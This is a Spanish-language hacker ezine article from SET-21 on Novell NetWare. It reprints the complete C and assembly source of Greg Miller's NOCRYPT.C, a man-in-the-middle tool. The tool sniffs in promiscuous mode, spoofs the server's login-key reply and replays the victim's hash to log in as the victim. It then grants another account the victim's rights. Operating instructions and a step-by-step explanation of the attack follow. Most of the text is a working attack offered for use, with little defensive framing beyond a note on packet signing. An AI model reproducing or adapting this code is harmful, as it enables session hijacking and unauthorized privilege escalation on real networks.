@@ -1,0 +1,751 @@
+-[ 0x06 ]--------------------------------------------------------------------
+-[ Curso de Novell Netware Aps III & IV ]------------------------------------
+-[ by Madfran ]-------------------------------------------------------SET-21-
+
+
+          Apendice Tres - Codigos fuente y otras documentaciones
+          ------------------------------------------------------
+
+
+A-03. Codigo Fuente de NOCRYPT
+------------------------------
+
+Los comentarios de Greg se encuentran en el mismo fichero, pero mirad
+el apendice A-04 para mas informacion
+
+(Traduccion madfran)
+
+---------------------------------------------------------------------------
+/*Este programa fue escrito en Septiembre de 1996 por Greg Miller     */
+
+/*NOCRYPT.C
+
+Este programa permite a un atacante hacerse pasar por un usuario sin conocer
+su password. Para mas informacion en como utilizarlo, consulta NOCRYPT.DOC
+Para mas informacion de como funciona el ataque, consulta ATTACK.DOC
+*/
+
+/*(C) 1996 by Greg Miller*/
+/*Libre distribucion*/
+
+#include <stdio.h>
+#include <string.h>
+
+#define TRUE -1
+#define FALSE 0
+#define PACKET_TYPE 19
+#define FUNCTION_CODE 50
+#define SUBFUNC_CODE 53
+#define KEY_OFFSET 54
+
+typedef unsigned char BYTE;
+typedef unsigned int WORD;
+typedef unsigned long DWORD;
+
+BYTE username[20] = "GUEST";                            //usuario victima
+BYTE membername[20] = "GMILLER";                        //derechos a conseguir
+
+BYTE server_network[4] = {0,0,0,15};                    //server INTERNAL net
+BYTE server_addr[6] = {0x00,0xa0,0x24,0x18,0x34,0x05};  //direccion del router
+                                                        //mas cercano
+
+BYTE my_network[4] = {0xd6,0xe2,0x5f,0xbe};             //0000 no funcionara
+BYTE my_addr[6] = {0x00,0x60,0x8c,0xc9,0x74,0x83};      //mi direccion
+
+BYTE SpoofStation[6] = {0x00,0x00,0xf4,0xa9,0x95,0x21}; //direccion a atacar
+
+BYTE my_seq_no = 1;
+BYTE my_con_no;
+BYTE login_key[8];
+
+int DataRemaining = TRUE;
+int x;
+
+BYTE packet[2000];
+BYTE SendPacket[2000];
+BYTE to_server[100];
+
+WORD handle;
+int packet_received = FALSE;
+int NotDone = TRUE;
+
+int c;
+WORD pktlen;
+WORD Sendpktlen;
+WORD to_server_len;
+
+void Initialize(){
+}
+
+static void far PacketReceived(){
+
+   /*El driver, llama a esta funcion, cuando se recibe un paquete
+     Si AX=0, se le pide al driver un buffer para colocar alli el paquete.
+     Si AX=1 se copia el paquete en el buffer.
+   */
+
+        _asm{
+                pop di          //Por alguna razon Borland C 3.1 enpuja DI.
+                                //Quita esta linea si tu compilador no lo hace.
+
+
+                cmp ax,1        //ax=0 para tomar un buffer o 1 cuando exista
+                jz copy_done
+
+                mov ax,seg packet
+                mov ES,ax
+                lea DI,packet
+                mov cx,2000     //longitud del buffer
+                retf
+        }
+
+copy_done:
+        packet_received = TRUE;
+        pktlen=_CX;
+
+        _asm{retf}
+end:
+}
+
+void RegisterWithPKTDRV(){
+
+     /*Esta funcion registra el "protocol stack" con el driver.
+       Le damos la direccion de la funcion a llamar cuando el paquete
+       se recibe en ES:DI, la clase de interface en AL, y el tipo de
+       interface en BX. DS:SI deberia apuntar al tipo de paquete a
+       recibir, con la longitud en CX, sin embargo, si recibimos
+       cualquier tipo de paquete dejaremos DS:SI y haremos CX=0.
+       Tomaremos un "handle" mediante una llamada INT 60h en AX, y lo
+       guardaremos para usos posteriores.
+     */
+
+        _asm {
+                pusha
+
+                mov bx,0ffffh  //Comodin para cualquier interface
+                mov dl,0
+                mov cx,0       //recibimos cualquier tipo de paquete
+                mov ax, seg PacketReceived
+                mov es,ax
+                lea di, PacketReceived
+                mov ah,02
+                mov al,01      //tipo de clase para  3com 509
+                int 60h
+                jc err
+
+                mov handle,ax
+
+                popa
+        }
+
+        printf("Registered with packet driver\r\n");
+        return;
+err:
+        printf("Error registering stack: %d\r\n",_DH);
+        _asm{popa}
+
+}
+
+void RelinquishProtocolStack(){
+        /*  Relinqush control of the interface */
+
+        /*Release Type*/
+        _asm{   pusha
+
+                mov ah,3
+                mov bx,handle
+                int 60h
+                jc err
+            }
+
+
+        /*Terminate driver for handle*/
+        _asm{
+                mov ah,5
+                mov bx,handle
+                int 60h
+                jc err
+
+                popa
+        }
+
+        printf("Stack Relinqushed\r\n");
+        return;
+err:
+        printf("Error releasing Stack: %d",_DH);
+}
+
+void SetReceiveMode(WORD mode){
+
+     /*Esta funcion pone la tarjeta en el modo adecuado, poniendo el
+       modo de recepcion en CX y el manejador en BX, El modo 6 es
+       promiscuo y el 2 es normal.
+     */
+
+        _asm{
+                pusha
+
+                mov ah,14h
+                mov bx,handle
+                mov cx,mode
+                int 60h
+                jc err
+
+                popa
+        }
+
+        printf("Mode set to %d\r\n",mode);
+        return;
+err:
+        printf("Error entering promiscuous mode: %d\r\n",_DH);
+        _asm{popa}
+}
+
+void printhex(BYTE d){
+ BYTE temp;
+ _asm{
+  mov al,d
+  shr al,1
+  shr al,1
+  shr al,1
+  shr al,1
+  and al,0fh
+  add al,90h
+  daa
+  adc al,40h
+  daa
+ }
+ temp=_AL;
+ printf("%c",temp);
+ _asm{
+  mov al,d
+  and al,0fh
+  add al,90h
+  daa
+  adc al,40h
+  daa
+ }
+ temp=_AL;
+ printf("%c ",temp);
+}
+
+void SendPack(){
+
+        _asm{   pusha
+
+                mov ax,seg SendPacket
+                mov ds,ax
+                lea si,SendPacket
+                mov cx,Sendpktlen
+                mov ah,04
+                int 60h
+
+                jc err
+
+                popa
+        }
+//      printf("Sending:\r\n");
+//      for(c=0;c<pktlen;c++){printhex(packet[c]);}
+//      printf("\r\n");
+        return;
+err:
+        printf("Error sending packet: %d\r\n",_DH);
+        _asm{popa}
+}
+
+void SendEncryptionKeyReply(){
+        memcpy(SendPacket,packet+6,6); //Copy 802.3 dest addr
+        memcpy(SendPacket+6,packet,6); //Copy 802.3 src addr
+
+        //Put 802.3 length here.
+        SendPacket[12]=00;
+        SendPacket[13]=0x2e;
+
+        memcpy(SendPacket+20,packet+32,12); //Copy dest addr,net,sock
+        memcpy(SendPacket+32,packet+20,12); //Copy src addr,net,sock
+        SendPacket[14]=0xff;SendPacket[15]=0xff; //Checksum
+        SendPacket[16]=0;SendPacket[17]=0x2e;    //IPX Length
+        SendPacket[18]=1;                        //Hop Count
+        SendPacket[19]=17;  //Packet type = NCP
+        SendPacket[44]=0x33; SendPacket[45]=0x33; //Reply Type
+        memcpy(SendPacket+46,packet+46,4);  //Seq num,con num,task,con num hi
+        SendPacket[50]=0;  //Completion code
+        SendPacket[51]=0;  //Connection Status
+
+        memcpy(SendPacket+52,login_key,8);  //Key
+
+        Sendpktlen = 60;
+//      printf("Spoofing Encryption Key Reply\r\n");
+        SendPack();
+}
+
+void WaitForPacket(){
+ while(!packet_received){
+  }
+
+// for(c=0;c<pktlen;c++){printhex(packet[c]);}
+// printf("\r\n");
+
+ packet_received=FALSE;
+}
+
+void WaitForStationLoginRequest(){
+
+        /*Discard first GetLoginKey()*/
+        while(NotDone){
+                WaitForPacket();
+                  if((memcmp(packet+6,SpoofStation,6)==0) &&
+                    (packet[PACKET_TYPE]==17) &&
+                    (packet[FUNCTION_CODE]==23) &&
+                    (packet[SUBFUNC_CODE]==23)){
+                     NotDone = FALSE;
+                  }
+        }
+
+        WaitForPacket();
+
+       /*Espera una peticion de llave de login y la falsifica */
+
+        NotDone=TRUE;
+        while(NotDone){
+                WaitForPacket();
+                  if((memcmp(packet+6,SpoofStation,6)==0) &&
+                    (packet[PACKET_TYPE]==17) &&
+                    (packet[FUNCTION_CODE]==23) &&
+                    (packet[SUBFUNC_CODE]==23)){
+                     NotDone = FALSE;
+                  }
+        }
+        SendEncryptionKeyReply();
+
+        /*Espera una peticion de login y lanza ell hash */
+
+        NotDone = TRUE;
+        while(NotDone){
+                WaitForPacket();
+                if((memcmp(packet+6,SpoofStation,6)==0) &&
+                  (packet[PACKET_TYPE]==17) &&
+                  (packet[FUNCTION_CODE]==23) &&
+                  (packet[SUBFUNC_CODE]==24)){
+                  NotDone = FALSE;
+                }
+        }
+        memcpy(login_key,packet+KEY_OFFSET,8);
+        printf("Hash Received\r\n");
+        for(c=0;c<8;c++){printhex(login_key[c]);}
+        printf("\r\n");
+}
+void SendToServer(){
+        _asm{   pusha
+
+                mov ax,seg to_server
+                mov ds,ax
+                lea si,to_server
+                mov cx,to_server_len
+                mov ah,04
+                int 60h
+
+                jc err
+
+                popa
+        }
+//      printf("Sending:\r\n");
+//      for(c=0;c<to_server_len;c++){printhex(to_server[c]);}
+//      printf("\r\n");
+        return;
+err:
+        printf("Error sending packet: %d\r\n",_DH);
+        _asm{popa}
+        printf("Sending packet\r\n");
+}
+
+void InitializePacket(){
+
+        memcpy(to_server,server_addr,6);//803.3 dest
+        memcpy(to_server+6,my_addr,6);  //802.3 source
+        //802.3 length
+        to_server[14] = 0xff; to_server[15]= 0xff;
+        //ipx length
+        to_server[18] = 0;              //hop count
+        to_server[19] = 17;             //packet type
+        memcpy(to_server+20,server_network,4);
+        to_server[24] = 0; to_server[25] = 0;
+        to_server[26] = 0; to_server[27] = 0;
+        to_server[28] = 0; to_server[29] = 1;
+        to_server[30] = 0x04; to_server[31] = 0x51;
+        memcpy(to_server+32,my_network,4);
+        memcpy(to_server+36,my_addr,6);
+        to_server[42]=0x40; to_server[43]=0x05;
+
+}
+
+void AttachToServer(){
+        to_server[44] = 0x11; to_server[45]= 0x11;      //request type
+        to_server[46] = 0;                              //sequence no.
+        to_server[47] = 0xff;                           //connection no.
+
+        to_server[12]=0; to_server[13]=38;              //802.3 length
+        to_server[16]=0; to_server[17]=37;              //ipx length
+
+        to_server_len=48;
+        SendToServer();
+}
+
+int GetConNumber(){
+        while(!((memcmp(packet,my_addr,6)==0) && (packet[46]==0))){}
+        if(packet[51]==0){
+                my_con_no=packet[47];
+                printf("Connected on con %d\r\n",my_con_no);
+        } else {
+                printf("Error connecting %d\r\n",packet[51]);
+        }
+        return -1;
+}
+
+void RequestLoginKey(){
+        to_server[12]=0; to_server[13]=40;              //802.3 len
+        to_server[16]=0; to_server[17]=40;              //IPX len
+
+        to_server[44]=0x22; to_server[45]=0x22;         //request type;
+        to_server[46]=my_seq_no;                        //sequence no.
+        to_server[47]=my_con_no;                        //connection no.
+        to_server[48]=1;                                //tast no.
+        to_server[49]=0;                                //conn no high
+        to_server[50]=23;                               //func code
+        to_server[51]=0; to_server[52]=1;               //subfunc len
+        to_server[53]=23;                               //subfunc code
+
+        to_server_len=54;
+        SendToServer();
+}
+
+int GetLoginKey(){
+   int x;
+        while(!((memcmp(packet,my_addr,6)==0) && (packet[46]==my_seq_no))){}
+        if(packet[50]==0){
+                memcpy(login_key,packet+52,8);
+                printf("Retreived login key");
+                for(x=0;x<8;x++){printf(" %d",login_key[x]);}
+                printf("\r\n");
+        } else {
+                printf("Error getting login key %d\r\n",packet[50]);
+        }
+        my_seq_no++;
+        return -1;
+}
+
+/*-----------------------------
+void WaitForLoginRequest(){
+        while(!((memcmp(packet,spoof_addr,6)==0) && (packet[44]==0x22) &&
+              (packet[45]==0x22) && (packet[50]==23) && (packet[53]==23))){}
+}
+-------------------------------
+void SpoofKeyReply(){
+        memcpy(send_packet,packet+6,6); memcpy(send_packet+6,packet,6);
+        send_packet[12]=0; send_packet[13]=46;
+        send_packet[14]=0xFF; send_packet[15]=0xFF;
+        send_packet[16]=0; send_packet[17]=46;
+        send_packet[18]=0;
+        send_packet[19]=17;
+        memcpy(send_packet+20,packet+31,12);
+        memcpy(send_packet+32,packet+19,12);
+        send_packet[44]=0x33; send_packet[45]=0x33;
+        memcpy(send_packet+46,packet+46,4);
+        send_packet[50]=0;
+        send_packet[51]=0;
+        memcpy(send_packet+52,login_key,8);
+
+        SendPacket();
+}
+-------------------------------
+void WaitForKeyedLoginRequest(){
+   int x;
+        while(!((memcmp(packet,spoof_addr,6)==0) && (packet[44]==0x22) &&
+              (packet[45]==0x22) && (packet[50]==23) && (packet[53]==24))){}
+        memcpy(login_key,packet+54,8);
+        printf("Got spoofed login key reply:");
+        for(x=0;x<7,x++) printf(" %d",login_key[x]);
+        printf("\r\n");
+}
+-------------------------------*/
+
+void RequestKeyedLogin(){
+   BYTE objlen;
+        objlen=strlen(membername);
+
+        to_server[12]=0; to_server[13]=51+objlen;       //802.3 len
+        to_server[16]=0; to_server[17]=51+objlen;       //ipx len
+
+        to_server[44]=0x22; to_server[45]=0x22;         //request type;
+        to_server[46]=my_seq_no;                        //sequence no.
+        to_server[47]=my_con_no;                        //connection no.
+        to_server[48]=1;                                //tast no.
+        to_server[49]=0;                                //conn no high
+        to_server[50]=23;                               //func code
+        to_server[51]=0; to_server[52]=12+objlen;       //subfunc len
+        to_server[53]=24;                               //subfunc code
+        memcpy(to_server+54,login_key,8);               //login key
+        to_server[62]=0; to_server[63]=1;               //object type
+        to_server[64]=objlen;                           //object length
+        memcpy(to_server+65,membername,objlen);         //object name
+
+        to_server_len=65+objlen;
+        SendToServer();
+}
+int GetKeyedLoginResults(){
+        while(!((memcmp(packet,my_addr,6)==0) && (packet[46]==my_seq_no))){}
+        if(packet[50]==0){
+                memcpy(login_key,packet+52,8);
+                printf("Logged in\r\n");
+        } else {
+                printf("Error logging in %d\r\n",packet[50]);
+        }
+        my_seq_no++;
+        return -1;
+}
+
+void GrantRights(){
+   BYTE objlen;
+   BYTE memlen;
+
+        objlen = strlen(username);
+        memlen = strlen(membername);
+
+        to_server[16]=0; to_server[17]=62+objlen+memlen;//IPX_len
+        to_server[12]=0; to_server[13]=to_server[17]; //802.3 len
+
+        to_server[44]=0x22;to_server[45]=0x22;          //Request type
+        to_server[46]=my_seq_no;                        //Sequence No.
+        to_server[47]=my_con_no;                        //connection no.
+        to_server[48]=1;                                //Task no.
+        to_server[49]=0;                                //conn no. high
+        to_server[50]=23;                               //func code
+        to_server[51]=0; to_server[52]=23+objlen+memlen;//subfun len
+        to_server[53]=65;                               //subfun code
+        to_server[54]=00; to_server[55]=1;              //Object type
+        to_server[56]=objlen;                           //object len
+        memcpy(to_server+57,username,objlen);           //object name
+        to_server[57+objlen]=15;                        //property len
+        memcpy(to_server+58+objlen,"SECURITY_EQUALS",15);//propertly name
+        to_server[73+objlen]=0; to_server[74+objlen]=1; //member type
+        to_server[75+objlen]=memlen;                    //member length
+        memcpy(to_server+76+objlen,membername,memlen);  //member name
+
+        printf("sublen %d\r\n",to_server[51]);
+
+        to_server_len=80+objlen+memlen;
+
+        for(x=0;x<100;x++) SendToServer();
+}
+
+void main(){
+
+        Initialize();
+        RegisterWithPKTDRV();
+
+        InitializePacket();
+
+        AttachToServer();
+        GetConNumber();
+
+        RequestLoginKey();
+        GetLoginKey();
+
+        SetReceiveMode(6);  //Promiscuous mode
+
+        WaitForStationLoginRequest();
+
+        SetReceiveMode(2);  //Normal mode
+
+        RequestKeyedLogin();
+        GetKeyedLoginResults();
+
+        GrantRights();
+
+        RelinquishProtocolStack();
+
+}
+
+
+Apendice Cuatro - Codigos fuente y otras documentaciones
+--------------------------------------------------------
+
+
+A-04. Documentacion para NOCRYPT y NOPAS. Explicacion del ataque
+
+(Traduccion madfran)
+
+---------------------------------------------------------------------------
+
+					NOCRYPT.DOC
+
+					Greg Miller
+
+El programa nocrypt.c utiliza un ataque tipo MITM (hombre en medio) para
+suplantar la sesion login de un usuario (ver attack.doc para detalles de
+este tipo de ataques).
+El programa debe lanzarse justo antes de que la victima intente hacer su
+login. Cuando se lanza, el programa espera hasta que la victima hace login,
+roba la sesion, y consigue para el atacante los mismos derechos de que 
+dispone la victima.
+
+Antes de compilar el programa es necesario dar valor a las siguientes 
+variables en el programa :
+ - La direccion de la estacion que deseas atacar.
+ - La direccion desde donde realizas el ataque.
+ - La direccion del router mas cercano.
+ - El nombre de la cuenta que quieres atacar.
+ - El nombre de la cuenta que va a conseguir los nuevos derechos.
+ - La direccion interna del server donde se quiere hacer la conexion.
+(Puede que alguien desee modificar el programa para evitar que se tengan
+que introducir todos estos valores a mano)
+
+NOTA : Con todas las direcciones tienes que especificar la direccion 
+especifica del server y no solo su direccion MAC.
+
+Despues de introducir los valores adecuados, compila el programa. El
+programa puede compilarse con Borland C++ 3.1. Sin embargo, tambien puede
+utilizarse cualquier compilador de C capaz de crear un ejecutable en DOS y que
+permita la inclusion de comandos ASM en la forma _asc { ... }. Si tu
+compilador no soporta este tipo de sintaxis, deberas editar todos los
+bloques tipo _asm{ ... } al formato que necesites.
+
+La etapa final antes de lanzar el programa es instalar un driver de 
+paquetes en INT 0x60. La mayor parte de las tarjetas de red vienen con un
+driver de paquetes en el disco de instalacion. Si no dispones del disco de
+instalacion o si este no tiene dichos drivers, buscalo en la red en las webs
+de fabricantes de tarjetas.
+Normalmente, deberias de especificar que interrupcion usa el driver, si es asi,
+utiliza 0x60. La notacion de 0x60 es hexadecimal, si tu driver no permite el
+uso de numeros hexadecimales, utiliza 96 (sin el prefijo 0x)
+Justo antes de que tu victima intente hacer login, lanza el programa. Si lo
+has configurado todo bien, robaras la sesion, el usuario que deseas tendra
+los derechos de la victima y el programa terminara automaticamente. Ahora,
+puedes reseater tu maquina, conectate como el atacante y tendras acceso a todos
+los archivos de la victima.
+
+Algo a tener en cuenta es que si la victima no es el supervisor, pero tiene
+derechos equivalentes al supervisor tu no habras heredado los derechos del
+supervisor cuando heredes los derechos de la victima. Sin embargo, nocrypt.c
+puede modificarse para adquirir los derechos de supervisor en este caso, pero
+no es el caso de la version actual. El ataque solo funciona si el nivel de
+firma de paquetes no esta al nivel 3 en el servidor. El nivel de firma de 
+paquetes en la estacion de trabajo, no tiene importancia. Debido a que el
+nivel por defecto para este parametro es 2, los administradores tienen que
+modificarlo a traves del archivo autoexec.ncf y cambiarlo cada vez que
+se arranque el server.
+ 
+No me envies preguntas acerca de este programa directamente a mi. Mejor
+lo envias a algun foro de seguridad de Netware del tipo
+comp.os.netware.security, o la lista de NetWare Hack  
+nw-hack@bebr.cba.ufl.edu.
+
+---------------------------------------------------------------------------
+
+
+                        Una explicacion de NOPASS.EXE
+                                Greg Miller
+                            September 26, 1996
+
+ El protocolo de login de Netware consiste en tres paquetes intercambiados
+entre el server y el cliente. 
+ - El cliente envia una peticion de una llave de login.
+ - El server genera una llave de ocho bytes y la envia al cliente.
+ - El cliente envia una peticion para la ID de usuario.
+ - El server mira en el bindery si existe la ID del usuario y la envia.
+ - Finalmente el cliente calcula X=hash(UID,password) Y=hash(UID,password)
+   y la envia al server.
+ - El server busca el valor X'=hash(UID,password) almacenado en el bindery
+   y calcula Y'=hash(X', llave login).
+Si Y=Y', el cliente es autorizado a entrar como usuario. Si cliente y usuario
+pueden utilizar paquetes firmados, ambos calculan Z=hash(X,c) (Donde c es un
+valor constante) que despues utilizaran como llave secreta como autentificacion
+El esquema siguiente da una idea grafica del protocolo.
+
+
+	Cliente								Server
+
+Peticion de llave de login ---------------------------------------->
+
+          <------------------------------------------------      Llave de login
+
+Peticion de ID de usuario --------------------------------------->
+
+          <------------------------------------------------     UID de cliente 
+
+Calculo X=hash(UID,password)                      Calculo X'=hash(UID,password)
+Calculo Y=hash(X,login key)                       Calculo Y'=hash(X,login key)
+
+Peticion de Autentificacion ------------------------------------------->	If Y=Y', Access is Granted
+
+Calculo Z=hash(X,c)                               Calculo Z=hash(X,c)
+
+ Cuando Alicia hace login, el atacante Bob puede interrumpir la secuencia
+y conseguir el acceso como Alicia sin conocer su password. Para que esto
+funcione, Debe estar situado en un punto desde donde pueda ver el trafico
+entre Alicia y el server y Bob debe ser capaz de responder al server antes 
+que Alicia.
+
+Secuencia del ataque :
+ - Primero Bob envia al server una peticion de login.
+ - El server envia a Bob una llave de login R". 
+ - Alicia envia al server una peticion de login.
+ - Bob captura la peticion envia a Alicia el valor R" como si fuera el server.
+ - El server recibe la peticion de Alicia y le envia una R.
+ - Alicia recibe R y la descarta como duplicada.
+ - Alicia pide al server su UID.
+ - El server se la envia.
+ - Alicia calcula X=hash(UID,password) and Y=hash(X,R") y la envia al server.
+ - El server calcula Y'=hash(X,), como Y' es distinto a Y, el server rechaza
+   a Alicia.
+ - Mientras tanto, Bob ve el valor Y que Alicia ha enviado al server.
+ - Envia este valor al server.
+ - El server calcula el Y"=hash(X,R"), ve que Y=Y" y da acceso a Bob como
+   si fuera Alicia.
+
+Bob pide que no se firmen los paquetes, si el server no lo exige a todos los
+clientes, Bob consigue introducirse como Alicia.
+
+	Alicia			Bob		            Server
+
+                           Peticion de llave login R"  ---->
+
+                                                       <----Envia R" a Bob
+
+Peticion de llave login R --------------------------------->
+
+                        <----   Envia R" a Alicia
+                        <----------------------------------- Envia R a Alicia
+Receve R" primero
+Rechaza R como duplicado
+
+Peticion UID para Alicia ----------------------------------->
+
+                       <----------------------------------- Envia UID a Alicia
+
+Calcula X=hash(UID,password)
+Calcula Y=hash(X,R")
+Envia Y al server        -----------------------------------> Calcula
+                                                                Y'=hash(X,R)
+                              Mira Y y lo guarda.            Y != Y',
+                                                             acceso denegado
+
+                                Envia Y para            ---> Calcula 
+                                        autentificarse          Y"=hash(X,R")
+                                                             Y"=Y, acceso
+                                                                permitido
+
+                                Rechaza la firma de paquetes Si todos los 
+                                                             clientes
+                                                             no REQUIREN los
+                                                             paquetes firmados
+                                                             el acceso es 
+                                                             posible.
+
+ Puede existir un segundo atacante, Joe, esperando a que Alicia se conecte
+sin firma de paquetes. Como resultado, Joe puede robar la conexion de Bob
+como si fuera Alicia.
+
+Madfran
+
+*EOF*
